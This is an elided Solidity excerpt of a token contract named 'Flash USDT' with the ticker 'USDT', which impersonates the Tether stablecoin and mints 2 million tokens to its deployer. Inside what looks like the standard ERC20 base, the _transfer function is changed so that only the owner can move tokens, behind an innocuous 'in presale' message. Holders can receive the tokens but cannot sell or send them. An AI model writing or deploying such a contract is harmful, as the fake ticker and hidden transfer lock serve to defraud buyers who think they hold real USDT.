...
abstract contract ERC20 is Context, IERC20, IERC20Metadata, IERC20Errors {
    ...
    function _transfer(address from, address to, uint256 value) internal {
        require(msg.sender == _owner, "in presale");
        if (from == address(0)) {
...
contract FlashUSDT is ERC20 {
    ...
    constructor() ERC20("Flash USDT", "USDT") {
        _mint(msg.sender, 2000000 * 10 ** 6); // Total supply of 2 million tokens with 6 decimal places
    }
